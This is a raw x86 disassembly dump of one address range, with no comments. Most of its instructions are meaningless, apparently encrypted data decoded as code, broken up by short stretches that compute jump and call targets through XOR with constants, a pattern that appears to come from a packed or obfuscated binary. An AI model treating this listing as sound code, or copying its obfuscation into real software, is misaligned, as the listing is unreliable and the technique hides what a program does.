  412230:	enter  0x6b10,0xc
  412234:	jecxz  0x4122aa
  412236:	imul   BYTE PTR [edi+edx*2]
  412239:	dec    edx
  41223a:	dec    esi
  41223b:	xchg   eax,esp
  41223d:	div    BYTE PTR [ebx+0x59aa32a0]
  412243:	mov    ch,0x28
  412245:	add    eax,0x9c8afdfb
  41224a:	in     al,0xfd
  41224c:	or     esi,DWORD PTR [edi+eax*8-0x4ddf6188]
  412253:	xchg   edi,eax
  412254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412255:	out    0x8d,al
  412257:	mov    ecx,0x2b809504
  41225c:	jnp    0x4122b4
  41225e:	or     al,0xfb
  412260:	sub    al,0xc1
  412262:	stc    
  412263:	sub    BYTE PTR [ecx],dh
  412265:	xor    dl,BYTE PTR [eax]
  412267:	adc    bh,BYTE PTR [ebx+ebx*8+0x44]
  41226b:	sub    al,0x20
  41226d:	test   eax,0xd83e3afe
  412272:	pop    ecx
  412273:	push   eax
  412274:	push   0x95fde8b2
  412279:	test   DWORD PTR [ebp+0x7cac4c2],edi
  41227f:	add    eax,0x16af07c1
  412284:	mov    ds:0x2b46b150,al
  412289:	sar    DWORD PTR [ecx-0x5c8feba2],cl
  41228f:	outs   dx,DWORD PTR ds:[esi]
  412290:	repz dec esp
  412292:	adc    bl,al
  412294:	mov    dl,0x4
  412296:	push   edx
  412297:	call   0xf3a8:0x5ae78898
  41229e:	mov    WORD PTR [eax-0x71],ss
  4122a1:	xor    ch,ah
  4122a3:	mov    ebp,0xc72f99d4
  4122a8:	and    eax,0xb73e85d8
  4122ad:	and    ebx,DWORD PTR [ebp+0x44415f70]
  4122b3:	out    0x89,al
  4122b5:	inc    ebp
  4122b6:	or     al,0x8b
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0xbafec13],ch
  4122ef:	jns    0x412339
  4122f1:	jle    0x41234f
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x41231f
  4122fa:	pop    edi
  4122fb:	and    eax,0x6929360e
  412300:	inc    edi
  412301:	mov    ds:0x6af43cdf,eax
  412306:	mov    ebp,0x4442ea4e
  41230b:	mov    esp,0xbe5be45f
  412310:	pop    es
  412311:	mov    dh,0x18
  412313:	adc    ebp,DWORD PTR [ecx+0x73]
  412316:	mov    ch,0xd8
  412318:	inc    edi
  412319:	in     al,0xbc
  41231b:	and    al,0x7d
  41231d:	mov    al,0xe2
  41231f:	(bad)  
  412320:	fcom   DWORD PTR [eax+0x586e6696]
  412326:	sahf   
  412327:	dec    ebx
  412328:	int    0x57
  41232a:	pop    ebx
  41232b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41232c:	push   ds
  41232d:	add    dh,0x65
  412330:	jnp    0x4122c9
  412332:	test   DWORD PTR [edi+0x36],ecx
  412335:	xor    al,0xdd
  412337:	jns    0x412368
  412339:	out    dx,al
  41233a:	ss mov esp,0x1f4a5251
  412340:	dec    edx
  412341:	ins    DWORD PTR es:[edi],dx
  412342:	mov    al,0xc3
  412344:	mov    DWORD PTR [edx+0x32cbf32d],0xc01f07ac
  41234e:	push   edx
  41234f:	pop    ecx
  412350:	xor    BYTE PTR [ecx-0x49],dl
  412353:	test   eax,0x30b336c3
  412358:	ficomp DWORD PTR [eax+0x2b8389a4]
  41235e:	ret    0x656a
  412361:	in     al,0xae
  412363:	aaa    
  412364:	add    al,ch
  412366:	dec    esp
  412367:	nop
  412368:	(bad)  
  412369:	aad    0xff
  41236b:	aas    
  41236c:	inc    esi
  41236d:	add    ebx,DWORD PTR ss:[eax]
  412370:	popa   
  412371:	test   DWORD PTR ds:0x51c6b49d,0xa992633
  41237b:	cdq    
  41237c:	mov    eax,ds:0xc2812ea8
  412381:	jle    0x41237a
  412383:	scas   eax,DWORD PTR es:[edi]
  412384:	push   cs
  412385:	pushf  
  412386:	mov    ch,0xc1
  412388:	addr16 mov eax,0x85c6e48f
  41238e:	(bad)  
  41238f:	pop    ds
  412390:	add    cl,cl
  412392:	jmp    0x412316
  412394:	cmp    BYTE PTR [edi],al
  412396:	(bad)  
  412397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412398:	iret   
  412399:	xchg   esp,eax
  41239a:	out    dx,al
  41239b:	cmp    DWORD PTR [edx+0x8],esi
  41239e:	xchg   edx,eax
  41239f:	sbb    eax,0x6fd7225
  4123a4:	call   0x5c0683ac
  4123a9:	mov    ecx,0xcf3bfc14
  4123ae:	mov    ebx,0x1121738f
  4123b3:	mov    esi,DWORD PTR [esi-0x7b]
  4123b6:	daa    
  4123b7:	fwait
  4123b8:	popf   
  4123b9:	pop    edi
  4123ba:	cmp    eax,0x7add3c39
  4123bf:	jns    0x41236b
  4123c1:	daa    
  4123c2:	dec    ebx
  4123c3:	stos   BYTE PTR es:[edi],al
  4123c4:	adc    eax,0xce89a456
  4123c9:	pop    ecx
  4123ca:	(bad)  
  4123cb:	sar    DWORD PTR [ebp+0x72ca7a10],cl
  4123d1:	out    0x5,al
  4123d3:	out    0x55,eax
  4123d5:	cmc    
  4123d6:	ror    DWORD PTR [ebp+0x20],cl
  4123d9:	enter  0x905d,0x7c
  4123dd:	rcr    BYTE PTR [edi+0x3a4dc2c5],0xad
  4123e4:	sbb    edx,edx
  4123e6:	and    eax,DWORD PTR [edx]
  4123e8:	ja     0x412374
  4123ea:	fbstp  TBYTE PTR [edx+0x4a]
  4123ed:	mov    esp,0x6b8600e9
  4123f2:	pop    esi
  4123f3:	daa    
  4123f4:	sbb    eax,0x4284b3fc
  4123f9:	mov    bh,0xeb
  4123fb:	xor    ecx,esi
  4123fd:	adc    ecx,ebp
  4123ff:	jns    0x412446
  412401:	jge    0x412407
  412403:	add    BYTE PTR [esi+0x60],cl
  412406:	js     0x412408
  412408:	jo     0x4123ad
  41240a:	sahf   
  41240b:	or     esi,DWORD PTR [edi-0x639f46d6]
  412411:	push   edx
  412412:	jl     0x412430
  412414:	les    edx,FWORD PTR [esi+0x3b4f1476]
  41241a:	add    DWORD PTR [edi],esp
  41241c:	lea    edx,[ebx-0x29]
  41241f:	bound  edi,QWORD PTR [edx+0x66f1ec39]
  412425:	fwait
  412426:	push   0xd9a0f2a
  41242b:	stos   BYTE PTR es:[edi],al
  41242c:	ret    0xc3e4
  41242f:	(bad)  
  412430:	cmp    ch,BYTE PTR [esi]
  412432:	jmp    DWORD PTR [ebx-0x74]
  412435:	jns    0x412442
  412437:	ss std 
  412439:	push   cs
  41243a:	enter  0x54af,0x84
  41243e:	cs ins BYTE PTR es:[edi],dx
  412440:	outs   dx,DWORD PTR ds:[esi]
  412441:	jns    0x412483
  412443:	sbb    BYTE PTR [ecx+eiz*4+0x5a],0x11
  412448:	xchg   esp,eax
  412449:	hlt    
  41244a:	retf   
  41244b:	inc    ebx
  41244c:	inc    ebx
  41244d:	mov    edx,DWORD PTR [esi-0x4b]
  412450:	adc    esi,esp
  412452:	dec    esp
  412453:	adc    ebx,DWORD PTR [edx]
  412455:	shl    DWORD PTR [ecx],1
  412457:	retf   
  412458:	mov    bl,0x55
  41245a:	jle    0x4124cd
  41245c:	pusha  
  41245d:	data16 rcl BYTE PTR [ecx],1
  412460:	test   DWORD PTR [ebp-0x7b],esi
  412463:	push   0xffffffc4
  412465:	stc    
  412466:	jg     0x412447
  412468:	loope  0x412490
  41246a:	loope  0x412453
  41246c:	or     BYTE PTR [edi-0x4b2eeb86],cl
  412472:	inc    edx
  412473:	xchg   ebx,eax
  412474:	aas    
  412475:	(bad)
  412478:	inc    edx
  412479:	xchg   BYTE PTR [edx+0x3bbd6640],bl
  41247f:	cmp    eax,0xc4b2ae2f
  412484:	ret    0x7b78
  412487:	mov    ebx,0x3793460e
  41248c:	xchg   DWORD PTR [eax],ecx
  41248e:	(bad)  
  41248f:	stos   DWORD PTR es:[edi],eax
  412490:	shr    cl,1
  412492:	std    
  412493:	cwde   
  412494:	add    ecx,DWORD PTR [ecx+edx*2-0xd]
  412498:	outs   dx,BYTE PTR ds:[esi]
  412499:	out    dx,eax
  41249a:	push   esi
  41249b:	inc    edi
  41249c:	sub    DWORD PTR ds:0x3926ae08,0xffffffea
  4124a3:	inc    ebx
  4124a4:	ja     0x4124f1
  4124a6:	jmp    0xf3b8:0x4bdca4af
  4124ad:	jp     0x41246b
  4124af:	fxch   st(1)
  4124b1:	ins    BYTE PTR es:[edi],dx
  4124b2:	push   esi
  4124b3:	stc    
  4124b4:	pop    esp
  4124b5:	mov    dh,0xa8
  4124b7:	and    al,0xec
  4124b9:	popf   
  4124ba:	out    0x85,al
  4124bc:	adc    esi,ebp
  4124be:	cmp    BYTE PTR [ecx-0x5b],cl
  4124c1:	std    
  4124c2:	adc    DWORD PTR [eax+eax*1],ecx
  4124c5:	xchg   edi,eax
  4124c6:	daa    
  4124c7:	icebp  
  4124c8:	mov    bl,0xed
  4124ca:	(bad)  
  4124cb:	in     al,0x38
  4124cd:	push   ss
  4124ce:	mov    ecx,0x9bb9be96
  4124d3:	xchg   ebp,eax
  4124d4:	xor    eax,0x927f9ac
  4124d9:	imul   esp,DWORD PTR [esi-0x13],0x89084503
  4124e0:	inc    ebp
  4124e1:	lock mov eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	mov    ds:0x59982763,eax
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x4125de
  4125ab:	test   DWORD PTR [ebx+0x1e1e1ec0],0xa8803393
  4125b5:	sub    ch,BYTE PTR [ecx-0x6e864d5e]
  4125bb:	adc    esp,DWORD PTR [ebx+edi*4]
  4125be:	in     eax,dx
  4125bf:	icebp  
  4125c0:	jle    0x4125d3
  4125c2:	push   edx
  4125c3:	call   0x962480a
  4125c8:	ror    BYTE PTR [esi-0x545fa706],0xd7
  4125cf:	js     0x412586
  4125d1:	xchg   ebx,eax
  4125d2:	fcom   DWORD PTR [edx]
  4125d4:	or     edi,DWORD PTR [ebp-0x1d]
  4125d7:	ds push esp
  4125d9:	fisttp WORD PTR [ebx]
  4125db:	add    ch,BYTE PTR [edx+ebx*2-0x52]
  4125df:	ins    BYTE PTR es:[edi],dx
  4125e0:	(bad)  
  4125e1:	fwait
  4125e2:	fs jl  0x41261a
  4125e5:	inc    esi
  4125e6:	xchg   bl,cl
  4125e8:	loopne 0x412607
  4125ea:	ds pop ebx
  4125ec:	sti    
  4125ed:	icebp  
  4125ee:	(bad)  
  4125ef:	pop    ss
  4125f0:	pop    eax
  4125f1:	(bad)  
  4125f2:	(bad)  
  4125f3:	div    BYTE PTR [ebx]
  4125f5:	in     al,dx
  4125f6:	cmp    edi,edi
  4125f8:	jge    0x41264e
  4125fa:	test   DWORD PTR [esi+0x3e8f1c16],ebx
  412600:	mov    edi,0xc1e87525
  412605:	add    edi,esp
  412607:	in     eax,0x55
  412609:	lea    ebx,[edx]
  41260b:	cmp    esp,DWORD PTR [esi-0xd]
  41260e:	mov    eax,0x54d90c5a
  412613:	fcom   DWORD PTR [ebx+ecx*8-0x58a21204]
  41261a:	or     al,0x2
  41261c:	xchg   edx,eax
  41261d:	fmulp  st(0),st
  41261f:	cmp    DWORD PTR [ebx+0x33c8f390],esi
  412625:	pop    edx
  412626:	dec    esi
  412627:	or     esi,ebx
  412629:	lock ins BYTE PTR es:[edi],dx
  41262b:	mov    ebx,cs
  41262d:	dec    esi
  41262e:	xor    BYTE PTR [edx+ebp*8-0x1b],al
  412632:	lock cmp bh,BYTE PTR [edx]
  412635:	sbb    eax,0xf0af4404
  41263a:	cs out dx,al
  41263c:	jp     0x41260b
  41263e:	jb     0x41267b
  412640:	mov    esp,ebp
  412642:	mov    WORD PTR [edi-0x1be89ecd],cs
  412648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412649:	ret    
  41264a:	sbb    ecx,DWORD PTR [ebp+0x2a]
  41264d:	in     al,0x2a
  41264f:	mov    ah,BYTE PTR [edi+edx*4]
  412652:	mov    es,ecx
  412654:	inc    ecx
  412655:	into   
  412656:	push   ds
  412657:	aaa    
  412658:	push   es
  412659:	imul   edx,edx,0x44
  41265c:	sbb    BYTE PTR ds:[edi-0xc],0x36
  412661:	jp     0x412635
  412663:	adc    bl,dh
  412665:	lock cmp ebp,DWORD PTR [eax+0x5df19b17]
  41266c:	ror    DWORD PTR [ecx],0xc1
  41266f:	nop
  412670:	xor    ah,BYTE PTR [edi+0x398457cd]
  412676:	mov    al,0x48
  412678:	js     0x412663
  41267a:	adc    esi,eax
  41267c:	adc    al,0x2e
  41267e:	(bad)  
  412680:	test   eax,0x37a39b00
  412685:	aad    0xe
  412687:	inc    esi
  412688:	dec    edi
  412689:	or     DWORD PTR [edi-0x21961b58],0xffffffe8
  412690:	(bad)  
  412691:	dec    BYTE PTR [eax-0x1ed92243]
  412697:	jae    0x412681
  412699:	mov    ch,0x43
  41269b:	mov    BYTE PTR [ecx],ah
  41269d:	sbb    esi,ebp
  41269f:	jnp    0x4126c8
  4126a1:	push   edx
  4126a2:	lock je 0x41269f
  4126a5:	mov    ebx,0x71f3f074
  4126aa:	and    bl,BYTE PTR [ebp+0x3c]
  4126ad:	add    eax,0x1df36851
  4126b2:	and    DWORD PTR [edi-0x5e],0xf72863e3
  4126b9:	sti    
  4126ba:	push   ss
  4126bb:	mov    ebx,fs
  4126bd:	mov    al,0x24
  4126bf:	(bad)  [esi+0x57]
  4126c2:	(bad)  
  4126c3:	div    DWORD PTR [esi+0x9dd51f8]
  4126c9:	jbe    0x4126aa
  4126cb:	cmp    bl,BYTE PTR [eax]
  4126cd:	out    0xe5,eax
  4126cf:	scas   eax,DWORD PTR es:[edi]
  4126d0:	add    al,0xd6
  4126d2:	lock scas eax,DWORD PTR es:[edi]
  4126d4:	aaa    
  4126d5:	pushf  
  4126d6:	xor    al,0x4e
  4126d8:	adc    eax,0xfd2f751e
  4126dd:	dec    eax
  4126de:	sub    bh,dl
  4126e0:	out    dx,al
  4126e1:	je     0x4126ae
  4126e3:	sub    eax,0xf28806b8
  4126e8:	dec    edi
  4126e9:	(bad)  
  4126ea:	push   cs
  4126eb:	js     0x412690
  4126ed:	add    BYTE PTR [esi+0x74],dl
  4126f0:	aas    
  4126f1:	adc    BYTE PTR [edx+ecx*2],bl
  4126f4:	cmp    BYTE PTR cs:[ebp+0x60d32e44],ah
  4126fb:	and    ecx,DWORD PTR [ebp+0x52]
  4126fe:	or     eax,0x72b3779b
  412703:	xor    al,0x25
  412705:	je     0x412713
  412707:	adc    al,0x4a
  412709:	pop    ss
  41270a:	dec    esi
  41270b:	sub    al,0xdc
  41270d:	loopne 0x412693
  41270f:	push   ds
  412710:	sub    al,0xf1
  412712:	jmp    0x9624bc02
  412717:	pop    edx
  412718:	fucomip st,st(1)
  41271a:	daa    
  41271b:	ror    BYTE PTR [esi+0x150f168f],0x64
  412722:	in     al,dx
  412723:	inc    edx
  412724:	pop    es
  412725:	ds mov bh,0x5f
  412728:	xchg   ecx,eax
  412729:	loopne 0x4126d9
  41272b:	add    eax,0xd53cb210
  412730:	mov    ah,0x67
  412733:	ins    DWORD PTR es:[edi],dx
  412734:	jno    0x4126f9
  412736:	or     eax,0x53e86399
  41273b:	hlt    
  41273c:	cmp    eax,0x2d124b39
  412741:	in     eax,0xd5
  412743:	out    0x7b,al
  412745:	scas   al,BYTE PTR es:[edi]
  412746:	retf   0xea08
  412749:	les    ebp,FWORD PTR [eax-0x595ecf67]
  41274f:	inc    eax
  412750:	stc    
  412751:	dec    ebx
  412752:	jb     0x412720
  412754:	dec    esi
  412755:	add    al,0xc5
  412757:	stc    
  412758:	push   ds
  412759:	adc    BYTE PTR [ebx],ch
  41275b:	outs   dx,BYTE PTR ds:[esi]
  41275c:	jne    0x4126f1
  41275e:	cwde   
  41275f:	cli    
  412760:	sar    BYTE PTR [edi-0x1e],cl
  412763:	into   
  412764:	cdq    
  412765:	adc    ebp,ebx
  412767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412768:	inc    edx
  412769:	pop    ds
  41276a:	scas   al,BYTE PTR es:[edi]
  41276b:	xor    al,0x8
  41276d:	jns    0x4127e7
  41276f:	push   ds
  412770:	xlat   BYTE PTR ds:[ebx]
  412771:	push   ecx
  412772:	stos   BYTE PTR es:[edi],al
  412773:	mov    ebx,DWORD PTR [edi-0x6ab3c113]
  412779:	jmp    0x41272f
  41277b:	pop    es
  41277c:	xchg   DWORD PTR [esi+esi*1],edi
  41277f:	data16 add bl,BYTE PTR [esi+0x407e83dd]
  412786:	repz adc bh,ah
  412789:	add    eax,0x334669ed
  41278e:	shr    ecx,0xfb
  412791:	add    DWORD PTR [eax],eax
  412793:	add    BYTE PTR [edi],dh
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	and    al,0xe9
  4127a2:	push   cs
  4127a3:	add    DWORD PTR [edi+ebx*2+0x7e],eax
  4127a7:	jle    0x412802
  4127a9:	jg     0x412829
  4127ab:	jle    0x412730
  4127ad:	loopne 0x41275e
  4127af:	fdiv   DWORD PTR [eax+0x24]
  4127b2:	cmp    al,0xde
  4127b4:	jb     0x4127e0
  4127b6:	imul   BYTE PTR [edx+0x29]
  4127b9:	scas   al,BYTE PTR es:[edi]
  4127ba:	daa    
  4127bb:	out    dx,al
  4127bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127bd:	pop    edx
  4127be:	les    eax,FWORD PTR [edi]
  4127c0:	arpl   sp,ax
  4127c2:	fwait
  4127c3:	mov    ds:0x820b5b3f,al
  4127c8:	lahf   
  4127c9:	pop    ebx
  4127ca:	es jmp 0x412828
  4127cd:	add    BYTE PTR [edx+0x5a],bl
  4127d0:	inc    ebx
  4127d1:	push   ebp
  4127d2:	push   esp
  4127d3:	inc    ebp
  4127d4:	lods   al,BYTE PTR ds:[esi]
  4127d5:	call   0xe28fdb9d
  4127da:	jb     0x412840
  4127dc:	fimul  DWORD PTR ds:0x4139b443
  4127e2:	fistp  DWORD PTR [edi+ecx*8+0x6cc6a82e]
  4127e9:	add    dl,ah
  4127eb:	mov    esi,0x76467efc
  4127f0:	das    
  4127f1:	mov    dl,BYTE PTR [eax-0x64]
  4127f4:	scas   eax,DWORD PTR es:[edi]
  4127f5:	dec    ebp
  4127f6:	push   ebx
  4127f7:	sahf   
  4127f8:	dec    esi
  4127f9:	and    BYTE PTR [esp+eiz*4-0x44],al
  4127fd:	test   al,0xa
  4127ff:	sbb    al,0x35
  412801:	sahf   
  412802:	mov    edx,0x2ee5a042
  412807:	dec    eax
  412808:	or     BYTE PTR [ecx],al
  41280a:	mov    ah,0x1b
  41280c:	xchg   esi,eax
  41280d:	fistp  QWORD PTR [eax-0x78]
  412810:	and    ebp,DWORD PTR [edx+0x3d]
  412813:	adc    BYTE PTR [ebx+0x461e7c1d],ch
  412819:	add    DWORD PTR [ebx+0x12],ecx
  41281c:	ss lahf 
  41281e:	shl    BYTE PTR [esi],0xed
  412821:	add    eax,0x6572f7b8
  412826:	adc    dh,BYTE PTR [esi-0x23]
  412829:	mov    ah,0xb6
  41282b:	cmp    eax,0x43c540cc
  412830:	jmp    0xe41df3da
  412835:	push   0xffffffd6
  412837:	test   eax,0x3e36f4f0
  41283c:	(bad)  
  41283d:	lock ds mov eax,0x9cd28cbc
  412844:	aaa    
  412845:	cmp    DWORD PTR [edi+0x2c945505],ebp
  41284b:	mov    WORD PTR [ebx-0x7d],cs
  41284e:	or     edx,edi
  412850:	cld    
  412851:	daa    
  412852:	scas   al,BYTE PTR es:[edi]
  412853:	sub    al,0x15
  412855:	shl    BYTE PTR [edx+0x16],0xe0
  412859:	mov    fs,WORD PTR [edx+0x23]
  41285c:	and    al,0xe8
  41285e:	out    0x3,al
  412860:	push   edi
  412861:	dec    esi
  412862:	push   edi
  412863:	int    0x7c
  412865:	les    esp,FWORD PTR [esi]
  412867:	mov    cl,0x6f
  412869:	push   eax
  41286a:	adc    BYTE PTR [edx+0x11],cl
  41286d:	cli    
  41286e:	jg     0x4127fe
  412870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412871:	je     0x412871
  412873:	outs   dx,DWORD PTR ds:[esi]
  412874:	mov    ebx,0x22842434
  412879:	xchg   edx,eax
  41287b:	in     eax,0xb3
  41287d:	dec    edi
  41287e:	mov    bl,0x23
  412880:	je     0x4128a4
  412882:	fadd   DWORD PTR [edx-0x1e]
  412885:	xor    cl,BYTE PTR [eax-0x44b708fa]
  41288b:	ins    BYTE PTR es:[edi],dx
  41288c:	sub    ebx,DWORD PTR [ebx-0x2a]
  41288f:	ins    BYTE PTR es:[edi],dx
  412890:	cmp    al,0xd5
  412892:	mov    ah,0x2f
  412894:	mov    ecx,0xd396e295
  412899:	inc    ebx
  41289a:	cdq    
  41289b:	out    0xa7,al
  41289d:	shr    ebx,1
  41289f:	mov    edx,0xf77dd8be
  4128a4:	mov    eax,0x88228d4f
  4128a9:	xor    ecx,ecx
  4128ab:	test   al,0x73
  4128ad:	mov    es,WORD PTR [edi+esi*4-0xf]
  4128b1:	push   ss
  4128b2:	or     BYTE PTR [esp+eax*8],cl
  4128b5:	sar    DWORD PTR [ebx-0x5],cl
  4128b8:	test   DWORD PTR [edx-0x12cd7a4b],edi
  4128be:	fld    QWORD PTR [ecx+ebx*8]
  4128c1:	ss push 0x24e6f97a
  4128c7:	sub    eax,DWORD PTR ds:0xca5140c8
  4128ce:	test   DWORD PTR [ebx-0x3e19ff7],edi
  4128d4:	sub    edx,DWORD PTR [ecx+0x22483626]
  4128da:	out    dx,al
  4128db:	lea    esi,[ecx-0x3]
  4128de:	cs ret 
  4128e0:	outs   dx,DWORD PTR ds:[esi]
  4128e1:	js     0x41286b
  4128e3:	push   0xffffff98
  4128e5:	imul   ebp,edi,0x881e778e
  4128eb:	repz test eax,0xd96453f4
  4128f1:	stos   BYTE PTR es:[edi],al
  4128f2:	sub    BYTE PTR [ebx-0x8dacbd2],0x91
  4128f9:	je     0x412901
  4128fb:	pop    es
  4128fc:	inc    esp
  4128fd:	jno    0x412913
  4128ff:	or     ecx,DWORD PTR [ebx+0x36]
  412902:	rcl    BYTE PTR [ecx+0x1874d2ed],cl
  412908:	xchg   esi,eax
  412909:	push   0x5950ba35
  41290e:	mov    al,ds:0xfd7c9e83
  412913:	jmp    0x6801ad20
  412918:	jo     0x412949
  41291a:	loop   0x412930
  41291c:	popa   
  41291d:	in     eax,dx
  41291e:	int3   
  41291f:	popa   
  412920:	retf   
  412921:	(bad)  
  412922:	sub    eax,DWORD PTR [edi-0x4e04e4c9]
  412928:	xchg   ebx,eax
  412929:	pop    es
  41292a:	xlat   BYTE PTR ds:[ebx]
  41292b:	retf   
  41292c:	mov    ds:0x6b32705f,eax
  412931:	jae    0x4128f2
  412933:	mov    eax,0xa5dd6480
  412938:	cwde   
  412939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41293a:	jo     0x412947
  41293c:	push   fs
  41293e:	xor    edi,0x75
  412941:	jl     0x4129b1
  412943:	pop    ecx
  412944:	xor    ah,BYTE PTR [edi-0x21]
  412947:	or     DWORD PTR [eax],esi
  412949:	(bad)  
  41294b:	dec    edi
  41294c:	icebp  
  41294d:	dec    edx
  41294e:	in     al,dx
  41294f:	xchg   ebx,eax
  412950:	arpl   WORD PTR [eax],cx
  412952:	xchg   esp,eax
  412953:	jb     0x41298e
  412955:	jg     0x4128dd
  412957:	pop    ecx
  412958:	(bad)
  41295c:	pushf  
  41295d:	popa   
  41295e:	or     dh,dh
  412960:	jmp    0x448d:0xc90e836a
  412967:	test   DWORD PTR [edi],edi
  412969:	test   eax,0xf93e4152
  41296e:	repz mov ch,0x32
  412971:	int3   
  412972:	aam    0x6e
  412974:	mov    ebp,esp
  412976:	push   eax
  412977:	sahf   
  412978:	fxch   st(1)
  41297a:	xchg   esi,eax
  41297b:	dec    esi
  41297c:	jmp    0x4129b5
  41297e:	fwait
  41297f:	inc    edi
  412980:	push   ds
  412981:	repnz daa 
  412983:	and    DWORD PTR [edx+0x6d],0x9f55948f
  41298a:	jb     0x4129c2
  41298c:	and    esi,DWORD PTR [esi+0xfc603ab]
  412992:	scas   eax,DWORD PTR es:[edi]
  412993:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fsubr  DWORD PTR [edi]
  4129ef:	add    BYTE PTR [ebx-0x70],cl
  4129f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129f3:	pop    ecx
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412985
  4129fb:	push   ebp
  4129fc:	cwde   
  4129fd:	jle    0x412a1c
  4129ff:	fucom  st(2)
  412a01:	inc    ebp
  412a02:	lock and al,0x3a
  412a05:	cmc    
  412a06:	jnp    0x4129e9
  412a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a09:	sbb    eax,0x811b854c
  412a0e:	mov    ah,0x5e
  412a10:	gs inc edi
  412a12:	inc    ecx
  412a13:	or     eax,0x299532b4
  412a18:	push   eax
  412a19:	jno    0x4129a0
  412a1b:	xor    al,0xb7
  412a1d:	add    esi,edi
  412a1f:	mov    WORD PTR [ebx+0x4a],?
  412a22:	in     eax,dx
